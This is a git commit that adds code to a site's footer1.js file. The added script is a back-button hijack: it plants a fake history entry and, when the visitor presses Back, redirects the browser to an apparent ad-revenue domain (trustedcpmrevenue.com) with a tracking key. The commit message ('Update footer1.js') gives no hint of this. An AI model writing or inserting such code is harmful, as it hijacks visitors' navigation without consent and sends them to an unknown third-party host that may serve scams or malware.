e97c99dcdc02a4c30175d06585e3509465ad7673
brianfinch-bit <85077897+brianfinch-bit@users.noreply.github.com>
2022-01-26 03:10:06 +0700

    Update footer1.js

--- footer1.js
+++ footer1.js
@@ -1,1 +1,13 @@
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
 
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("https://www.trustedcpmrevenue.com/ag4ajq94m3?key=2d1cee70c6f009dda970a363aa6fa19c");
+    },10);
+  }
+}, false);
+}(window, location));
